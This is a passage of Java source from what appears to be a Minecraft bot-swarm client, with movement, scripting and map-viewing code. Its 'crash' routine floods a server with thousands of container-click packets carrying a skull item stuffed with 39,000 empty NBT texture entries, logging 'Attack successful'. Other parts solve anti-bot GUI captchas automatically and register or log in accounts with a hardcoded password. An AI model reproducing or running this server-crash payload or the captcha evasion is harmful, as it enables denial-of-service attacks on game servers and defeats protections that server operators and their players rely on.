                if (!client.isConnected()) break;
                try {
                    selectHotbarSlot(slot);
                    Thread.sleep(50);
                    client.send(new ServerboundPlayerActionPacket(PlayerAction.DROP_ITEM_STACK, new Position(0, 0, 0), Direction.DOWN));
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            if (client.isConnected()) {
                Log.info("Finished dropping items for " + nickname);
            }
        });
    }

    public String getNickname() {
        return nickname;
    }

    public void registerMainListener() {
        hasMainListener = true;
        if (Main.isMinimal()) return;
        client.addListener(new MainListener(nickname));
    }

    public boolean hasMainListener() {
        return hasMainListener;
    }

    public void fallDown() {
    }

    public void move(double x, double y, double z) {
        lastX += x;
        lastY += y;
        lastZ += z;
        moveTo(lastX, lastY, lastZ);
    }

    public void moveTo(double x, double y, double z) {
        lastX = x;
        lastY = y;
        lastZ = z;
        client.send(new ServerboundMovePlayerPosRotPacket(onGround, x, y, z, lastYaw, lastPitch));
    }

    public void moveSmoothlyTo(double targetX, double targetY, double targetZ) {
        double startX = lastX;
        double startY = lastY;
        double startZ = lastZ;

        double dx = targetX - startX;
        double dy = targetY - startY;
        double dz = targetZ - startZ;

        double distance = Math.sqrt(dx * dx + dy * dy + dz * dz);
        double speed = 4.317;
        double totalTimeSeconds = distance / speed;

        int rawSteps = (int) (totalTimeSeconds * 20);
        int steps = Math.max(1, rawSteps);

        double stepX = dx / steps;
        double stepY = dy / steps;
        double stepZ = dz / steps;

        new Thread(() -> {
            for (int i = 1; i <= steps; i++) {
                double nextX = startX + stepX * i;
                double nextY = startY + stepY * i;
                double nextZ = startZ + stepZ * i;

                lastX = nextX;
                lastY = nextY;
                lastZ = nextZ;

                client.send(new ServerboundMovePlayerPosRotPacket(onGround, nextX, nextY, nextZ, lastYaw, lastPitch));
                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }).start();
    }

    public void startSectorSwapping() {
        if (sectorSwapExecutor != null && !sectorSwapExecutor.isShutdown()) {
            Log.info("Sector swapping is already running for " + nickname);
            return;
        }

        sectorSwapExecutor = Executors.newSingleThreadScheduledExecutor();
        currentSwapSector = 1;

        Log.info("Starting automatic sector swapping for bot #" + botId);

        sectorSwapExecutor.scheduleAtFixedRate(() -> {
            if (!client.isConnected()) {
                sectorSwapExecutor.shutdown();
                return;
            }

            Log.info("Bot #" + botId + " (" + nickname + ") swapping to sector " + currentSwapSector);
            changeSector(currentSwapSector, "sector", 0);

            currentSwapSector++;
            if (currentSwapSector > ServerLoop) {
                currentSwapSector = 1;
            }
        }, 0, 20, TimeUnit.SECONDS);
    }

    public void stopSectorSwapping() {
        if (sectorSwapExecutor != null && !sectorSwapExecutor.isShutdown()) {
            Log.info("Stopping automatic sector swapping for bot #" + botId);
            sectorSwapExecutor.shutdownNow();
            sectorSwapExecutor = null;
        }
    }

    public void autoLogin() {
        sendChat("/login XqBots!@3");
    }

    public void autoRegister() {
        sendChat("/register XqBots!@3 XqBots!@3");
    }

    public void startSendingPackets() {
        Log.imp("Starting crash with " + nickname);
        scriptExecutor.submit(() -> {
            ItemStack itemStack = this.getSkullStack(39000, 10, "empty");
            for (int i = 0; i < 4500; ++i) {
                if (!client.isConnected()) break;
                ServerboundContainerClickPacket clickPacket = new ServerboundContainerClickPacket(0, 0, 20, ContainerActionType.CLICK_ITEM, ClickItemAction.LEFT_CLICK, itemStack, new HashMap<>());
                client.send(clickPacket);
            }
            if (client.isConnected()) {
                Log.imp("Attack successful, finished sending packets!");
            }
        });
    }


    public ItemStack getSkullStack(int size, int length, String type) {
        CompoundTag skullTag = new CompoundTag("SkullTag");

        CompoundTag skullOwner = new CompoundTag("SkullOwner");
        CompoundTag properties = this.getSkullCompound(size, length, type);

        skullOwner.put(properties);
        skullOwner.put(new StringTag("Name", String.valueOf(ThreadLocalRandom.current().nextInt())));
        skullOwner.put(new StringTag("Id", UUID.randomUUID().toString()));

        skullTag.put(skullOwner);

        return new ItemStack(397, 1, skullTag);
    }


    private CompoundTag getSkullCompound(int size, int length, String propType) {
        CompoundTag properties = new CompoundTag("Properties");
        ListTag list = new ListTag("textures", CompoundTag.class);

        if (propType.equalsIgnoreCase("full")) {
            String value = generateRandomString(length);
            for (int i = 0; i < size; i++) {
                CompoundTag tag = new CompoundTag("");
                tag.put(new StringTag("Value", value));
                tag.put(new StringTag("Signature", value));
                list.add(tag);
            }
        } else if (propType.equalsIgnoreCase("empty")) {
            for (int i = 0; i < size; i++) {
                list.add(new CompoundTag(""));
            }
        }

        properties.put(list);
        return properties;
    }


    private String generateRandomString(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) ('a' + ThreadLocalRandom.current().nextInt(26)));
        }
        return sb.toString();
    }

    public void executeScriptFromFile() {
        if (actionsFilePath == null || actionsFilePath.trim().isEmpty()) {
            return;
        }

        Log.info("Starting to execute script from file: " + actionsFilePath, nickname);
        try (BufferedReader reader = new BufferedReader(new FileReader(actionsFilePath))) {
            List<String> lines = new ArrayList<>();
            reader.lines().forEach(lines::add);

            for (int i = 0; i < lines.size(); i++) {
                String line = lines.get(i);

                if (line.contains("#")) {
                    line = line.split("#", 2)[0];
                }
                String trimmedLine = line.trim();

                if (trimmedLine.isEmpty()) {
                    continue;
                }

                if (trimmedLine.startsWith("[loop") && trimmedLine.endsWith("]:")) {
                    String[] parts = trimmedLine.substring(1, trimmedLine.length() - 2).split(" ");
                    if (parts.length < 2) {
                        Log.error("Invalid loop syntax: " + trimmedLine);
                        continue;
                    }
                    int loopCount;
                    try {
                        loopCount = Integer.parseInt(parts[1]);
                    } catch (NumberFormatException e) {
                        Log.error("Invalid loop count in: " + trimmedLine);
                        continue;
                    }

                    List<String> loopBody = new ArrayList<>();
                    int baseIndentation = getIndentation(line);
                    int bodyIndentation = -1;
                    i++;

                    while (i < lines.size()) {
                        String loopLine = lines.get(i);
                        int currentIndentation = getIndentation(loopLine);
                        if (bodyIndentation == -1) {
                            if (currentIndentation > baseIndentation && !loopLine.trim().isEmpty()) {
                                bodyIndentation = currentIndentation;
                            } else {
                                i--;
                                break;
                            }
                        }
                        if (currentIndentation >= bodyIndentation) {
                            loopBody.add(loopLine);
                            i++;
                        } else {
                            i--;
                            break;
                        }
                    }
                    Log.info("Executing loop " + loopCount + " times...", nickname);
                    for (int j = 0; j < loopCount; j++) {
                        Log.info("Loop iteration " + (j + 1) + "/" + loopCount, nickname);
                        for (String commandInLoop : loopBody) {
                            processCommand(commandInLoop);
                        }
                    }
                    Log.info("Loop finished.", nickname);

                } else {
                    processCommand(line);
                }
            }
            Log.info("Script finished successfully!", nickname);
        } catch (IOException e) {
            Log.error("Could not read script file: " + actionsFilePath + ". Error: " + e.getMessage());
        } catch (InterruptedException e) {
            Log.info("Script execution was interrupted.", nickname);
            Thread.currentThread().interrupt();
        }
    }

    public void processCommand(String rawLine) throws InterruptedException {
        if (rawLine == null) return;

        String line = rawLine;
        if (line.contains("#")) {
            line = line.split("#", 2)[0];
        }
        line = line.trim();

        if (!line.startsWith("[") || !line.endsWith("]")) {
            return;
        }

        String commandStr = line.substring(1, line.length() - 1);
        String[] parts = commandStr.split(" ");
        String command = parts[0].toLowerCase();

        if (!command.startsWith("log")) {
            Log.info("Executing command: [" + commandStr + "]", nickname);
        }


        try {
            switch (command) {
                case "swap":
                    Log.info("Starting sector swapping from script for " + nickname);
                    Main.setAutoSwapState(true);
                    startSectorSwapping();
                    break;
                case "guicaptcha":
                    solveGuiCaptcha();
                    break;
                case "yaw":
                    if (parts.length > 1) {
                        float val = Float.parseFloat(parts[1]);
                        this.lastYaw = val;
                        client.send(new ServerboundMovePlayerRotPacket(onGround, lastYaw, lastPitch));
                        Log.info("Yaw set to " + val, nickname);
                    }
                    break;

                case "shoot":
                    if (parts.length > 1) {
                        String sub = parts[1].toLowerCase();
                        if (sub.equals("on")) {
                            startShooting();
                        } else if (sub.equals("off")) {
                            stopShooting();
                        }
                    }
                    break;
                case "pitch":
                    if (parts.length > 1) {
                        float val = Float.parseFloat(parts[1]);
                        this.lastPitch = val;
                        client.send(new ServerboundMovePlayerRotPacket(onGround, lastYaw, lastPitch));
                        Log.info("Pitch set to " + val, nickname);
                    }
                    break;

                case "look":
                    if (parts.length > 2) {
                        float newYaw = Float.parseFloat(parts[1]);
                        float newPitch = Float.parseFloat(parts[2]);
                        this.lastYaw = newYaw;
                        this.lastPitch = newPitch;
                        client.send(new ServerboundMovePlayerRotPacket(onGround, lastYaw, lastPitch));
                        Log.info("Look set to Yaw: " + newYaw + " Pitch: " + newPitch, nickname);
                    }
                    break;
                case "gravity":
                    if (parts.length > 1) {
                        String sub = parts[1].toLowerCase();
                        if (sub.equals("off")) {
                            this.gravityEnabled = false;

                            if (gravityExecutor != null) {
                                gravityExecutor.shutdownNow();
                            }

                            stopHeadroll();

                            if (vehicleExecutor != null) {
                                vehicleExecutor.shutdownNow();
                            }

                            client.send(new ServerboundMovePlayerPosRotPacket(true, lastX, lastY, lastZ, lastYaw, lastPitch));

                            Log.info("Freeze mode enabled (All movement packets stopped).", nickname);

                        } else if (sub.equals("on")) {
                            this.gravityEnabled = true;
                            Log.info("Gravity enabled.", nickname);

                            if (!isInVehicle) {
                                startGravitySimulation();
                            } else {
                                startVehicleSimulation();
                            }
                        }
                    }
                    break;
                case "wait":
                    if (parts.length > 1) Thread.sleep(Long.parseLong(parts[1]));
                    break;
                case "goto":
                    if (parts.length > 3)
                        moveSmoothlyTo(Double.parseDouble(parts[1]), Double.parseDouble(parts[2]), Double.parseDouble(parts[3]));
                    break;
                case "move":
                    if (parts.length > 3)
                        move(Double.parseDouble(parts[1]), Double.parseDouble(parts[2]), Double.parseDouble(parts[3]));
                    break;
                case "slot":
                    if (parts.length > 1) selectHotbarSlot(Integer.parseInt(parts[1]));
                    break;
                case "afksector":
                case "sector":
                    if (parts.length < 2) {
                        Log.info("Usage: [sector <number|auto|autoN>]", nickname);
                        break;
                    }
                    String sectorArg = parts[1].toLowerCase();

                    if (sectorArg.equals("auto")) {
                        Log.info("Changing sector automatically to bot's ID: " + this.botId, nickname);
                        changeSector(this.botId, command, 0);

                    } else if (sectorArg.startsWith("auto")) {
                        try {
                            String numberPart = sectorArg.substring(4);
                            int groupSize = Integer.parseInt(numberPart);

                            if (groupSize <= 0) {
                                Log.info("Group size for auto-sector must be a positive number.", nickname);
                                break;
                            }
                            int targetSector = ((this.botId - 1) / groupSize) + 1;
                            Log.info("Grouping by " + groupSize + ". Bot #" + this.botId + " is going to sector " + targetSector, nickname);
                            changeSector(targetSector, command, 0);

                        } catch (NumberFormatException | StringIndexOutOfBoundsException e) {
                            Log.info("Invalid auto-sector format. Use 'auto' or 'auto<number>', e.g., '[sector auto3]'.", nickname);
                        }
                    } else {
                        try {
                            int sectorNumber = Integer.parseInt(sectorArg);
                            changeSector(sectorNumber, command, 0);
                        } catch (NumberFormatException e) {
                            Log.info("Invalid sector argument: '" + sectorArg + "'. Must be a number, 'auto', or 'auto<N>'.", nickname);
                        }
                    }
                    break;
                case "right":
                    rightClickWithItem();
                    break;
                case "login":
                    autoLogin();
                    break;
                case "register":
                    autoRegister();
                    break;
                case "ascii":
                    List<String> messagesToUse;
                    if (parts.length > 1) {
                        String filePath = String.join(" ", Arrays.copyOfRange(parts, 1, parts.length));
                        messagesToUse = Main.loadMessagesFromFile(filePath);
                    } else {
                        Log.info("No file path provided in script, using default ASCII messages.");
                        messagesToUse = Arrays.asList("a", "s", "c", "i", "i");
                    }

                    if (messagesToUse != null && !messagesToUse.isEmpty()) {
                        Main.triggerAsciiSequence(messagesToUse);
                    }
                    break;
                case "crash":
                    startSendingPackets();
                    break;
                case "gui":
                    if (parts.length > 1) clickSlotInAllContainers(Integer.parseInt(parts[1]));
                    break;
                case "chat":
                    if (parts.length > 1) {
                        String message = String.join(" ", Arrays.copyOfRange(parts, 1, parts.length));
                        if (message.startsWith("/")) {
                            Log.warn("You should use [execute /command] instead of [chat /command] to send server commands!");
                        }
                        sendChat(message);
                    }
                    break;
                case "execute":
                case "cmd":
                    if (parts.length > 1) {
                        String serverCommand = String.join(" ", Arrays.copyOfRange(parts, 1, parts.length));
                        if (!serverCommand.startsWith("/")) {
                            serverCommand = "/" + serverCommand;
                        }
                        sendChat(serverCommand);
                    }
                    break;
                case "log":
                    if (parts.length > 1) {
                        Log.info("Info | " + String.join(" ", Arrays.copyOfRange(parts, 1, parts.length)));
                    }
                    break;
                default:
                    Log.error("Unknown command in script: " + command);
                    break;
            }
        } catch (NumberFormatException e) {
            Log.error("Invalid number in command: " + commandStr);
        }
    }
    public InetSocketAddress getAddress() {
        return address;
    }

    public ProxyInfo getProxy() {
        return proxy;
    }

    public String getActionsFilePath() {
        return actionsFilePath;
    }

    public ListenerManager getListenerManager() {
        return listenerManager;
    }
    public void solveGuiCaptcha() {
        if (currentWindowId == 0 || currentWindowItems.isEmpty()) {
            Log.info("No GUI is currently open. Skipping [guicaptcha].", nickname);
            return;
        }

        // 1. Obliczamy granicę między GUI a ekwipunkiem gracza.
        // Ekwipunek gracza to zawsze ostatnie 36 slotów (27 plecak + 9 hotbar).
        int maxSlot = 0;
        for (int s : currentWindowItems.keySet()) {
            if (s > maxSlot) maxSlot = s;
        }
        // Wszystko >= inventoryStartIndex to itemy u gracza, nie w skrzyni
        int inventoryStartIndex = maxSlot - 35;
        if (inventoryStartIndex < 0) inventoryStartIndex = maxSlot; // Zabezpieczenie

        Log.info("Analyzing GUI items for captcha (Container size: " + inventoryStartIndex + ")...", nickname);

        Map<String, Integer> nameCounts = new HashMap<>();
        Map<String, Integer> nameToSlot = new HashMap<>();

        for (Map.Entry<Integer, ItemStack> entry : currentWindowItems.entrySet()) {
            int slot = entry.getKey();
            ItemStack item = entry.getValue();

            // 2. POMIJAMY EKWIPUNEK GRACZA - sprawdzamy tylko sloty kontenera
            if (slot >= inventoryStartIndex) continue;

            if (item == null) continue;

            String displayName = getItemName(item).trim(); // Trim usuwa spacje z początku/końca

            // Ignorujemy puste sloty/powietrze oraz itemy bez nazwy
            if (item.getId() == 0 || displayName.isEmpty()) continue;

            nameCounts.put(displayName, nameCounts.getOrDefault(displayName, 0) + 1);
            nameToSlot.put(displayName, slot);
        }

        String uniqueName = null;

        // Szukamy nazwy, która wystąpiła dokładnie 1 raz
        for (Map.Entry<String, Integer> entry : nameCounts.entrySet()) {
            if (entry.getValue() == 1) {
                uniqueName = entry.getKey();
                break;
            }
        }

        if (uniqueName != null) {
            int slotToClick = nameToSlot.get(uniqueName);
            Log.info("Found unique item: '" + uniqueName + "' at slot " + slotToClick, nickname);
            clickSlot(slotToClick, currentWindowId);
        } else {
            Log.warn("Could not find a unique item in the GUI.", nickname);
            // Debug: wypisz co znalazł (skrócony)
            for (String key : nameCounts.keySet()) {
                Log.info("Item: '" + key + "' Count: " + nameCounts.get(key));
            }
        }
    }

    // Pomocnicza metoda do wyciągania CZYSTEJ nazwy z JSONa
    private String getItemName(ItemStack item) {
        if (item.getNbt() != null && item.getNbt().contains("display")) {
            CompoundTag display = (CompoundTag) item.getNbt().get("display");
            if (display.contains("Name")) {
                String jsonName = display.get("Name").getValue().toString();
                try {
                    // Parsowanie JSONa, żeby wyciągnąć "text"
                    // Obsługuje format: {"extra":[{"text":"Perelka"}],"text":""}
                    com.google.gson.JsonElement parsed = new com.google.gson.JsonParser().parse(jsonName);

                    if (parsed.isJsonObject()) {
                        com.google.gson.JsonObject json = parsed.getAsJsonObject();
                        StringBuilder sb = new StringBuilder();

                        // Czasami nazwa jest bezpośrednio w "text"
                        if (json.has("text")) {
                            sb.append(json.get("text").getAsString());
                        }

                        // Czasami nazwa jest rozbita w "extra"
                        if (json.has("extra")) {
                            for (com.google.gson.JsonElement e : json.getAsJsonArray("extra")) {
                                if (e.isJsonObject() && e.getAsJsonObject().has("text")) {
                                    sb.append(e.getAsJsonObject().get("text").getAsString());
                                }
                            }
                        }

                        // Jeśli udało się coś wyciągnąć, zwracamy czysty tekst
                        if (sb.length() > 0) return sb.toString();
                    }
                } catch (Exception e) {
                    // Jeśli parsowanie się nie uda, trudno, zwracamy oryginał
                }
                return jsonName;
            }
        }
        // Jeśli nie ma nazwy, używamy ID
        return String.valueOf(item.getId());
    }

    private int getIndentation(String line) {
        int indentation = 0;
        for (char c : line.toCharArray()) {
            if (c == ' ' || c == '\t') {
                indentation++;
            } else {
                break;
            }
        }
        return indentation;
    }

    // --- KLASY WEWNĘTRZNE DO OBSŁUGI MAPY ---

    private class MapHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            BufferedImage image = new BufferedImage(128, 128, BufferedImage.TYPE_INT_RGB);

            // 1. Sprawdź co bot trzyma w łapce
            ItemStack heldItem = null;
            if (currentSlot >= 0 && currentSlot < 9) {
                heldItem = hotbarItems[currentSlot];
            }

            boolean hasMap = false;
            int mapId = -1;

            // 2. Sprawdź czy to mapa (ID itemu mapy to zazwyczaj filled_map, ID ~358 w starszych lub nazwa w nowszych)
            // Tutaj sprawdzamy po prostu czy item ma tag NBT "map", który przechowuje ID mapy.
            if (heldItem != null && heldItem.getNbt() != null) {
                CompoundTag tag = (CompoundTag) heldItem.getNbt();
                if (tag.contains("map")) {
                    // Pobieramy ID mapy z NBT
                    Object mapTagValue = tag.get("map").getValue();
                    if (mapTagValue instanceof Number) {
                        mapId = ((Number) mapTagValue).intValue();
                        hasMap = true;
                    }
                }
            }

            // 3. Rysowanie
            if (hasMap && mapCache.containsKey(mapId)) {
                byte[] colors = mapCache.get(mapId);
                for (int i = 0; i < colors.length; i++) {
                    int x = i % 128;
                    int y = i / 128;
                    if (y >= 128) break;

                    // Konwersja bajtu MC na RGB
                    int rgb = MapPalette.getColor(colors[i] & 0xFF);
                    image.setRGB(x, y, rgb);
                }
            } else {
                // Rysuj placeholder jeśli nie ma mapy
                java.awt.Graphics2D g = image.createGraphics();
                g.setColor(Color.BLACK);
                g.fillRect(0, 0, 128, 128);
                g.setColor(Color.WHITE);
                if (hasMap) {
                    g.drawString("Czekam na dane...", 10, 64);
                    g.drawString("Map ID: " + mapId, 10, 80);
                } else {
                    g.drawString("Brak mapy w rece", 10, 64);
                }
                g.dispose();
            }

            // 4. Wyślij obrazek jako odpowiedź
            t.getResponseHeaders().set("Content-Type", "image/png");
            // Odświeżaj stronę co 1 sekundę
            t.getResponseHeaders().set("Refresh", "1");
            t.sendResponseHeaders(200, 0);

            OutputStream os = t.getResponseBody();
            ImageIO.write(image, "png", os);
            os.close();
        }
    }

    // Uproszczona paleta kolorów Minecrafta
    private static class MapPalette {
        // Podstawowe kolory (bez odcieni) - Minecraft 1.12+ ma ich więcej, to jest baza
        private static final int[] BASE_COLORS = {
                0x000000, 0x7F9323, 0xF7E9A3, 0xA7A7A7, 0xFF0000, 0xA0A0FF, 0xA7A7A7, 0x007C00,
                0xFFFFFF, 0xA4A8B8, 0x976D4D, 0x707070, 0x4040FF, 0x8F7748, 0xFFFCF5, 0xD87F33,
                0xB24CD8, 0x6699D8, 0xE5E533, 0x7FCC19, 0xF27FA5, 0x4C4C4C, 0x999999, 0x4C7F99,
                0x7F3FB2, 0x334CB2, 0x664C33, 0x667F33, 0x993333, 0x191919, 0xFAEE4D, 0x5CDBD5,
                0x4A80FF, 0x00D93A, 0x815631, 0x700200, 0xD1B1A1, 0x95576C, 0x706C8A, 0xBA8524,
                0x677535, 0xA04D4E, 0x392923, 0x876B62, 0x575C5C, 0x7A4958, 0x4C3E5C, 0x4C3223,
                0x4C522A, 0x8E3C2E, 0x251610, 0xBD3031, 0x941C41
                // ... lista jest dłuższa w nowszych wersjach, ale to wystarczy na start
        };

        public static int getColor(int byteValue) {
            int baseColorIndex = byteValue >> 2;
            int shade = byteValue & 3;

            if (baseColorIndex >= BASE_COLORS.length) return 0x000000;

            int color = BASE_COLORS[baseColorIndex];

            // Proste cieniowanie (Minecraft używa mnożników: 180/255, 220/255, 255/255, 135/255)
            int r = (color >> 16) & 0xFF;
            int g = (color >> 8) & 0xFF;
            int b = color & 0xFF;

            int multiplier = 255;
            if (shade == 0) multiplier = 180;
            else if (shade == 1) multiplier = 220;
            else if (shade == 2) multiplier = 255;
            else if (shade == 3) multiplier = 135;

            r = (r * multiplier) / 255;
            g = (g * multiplier) / 255;
            b = (b * multiplier) / 255;

            return (r << 16) | (g << 8) | b;
        }
    }
}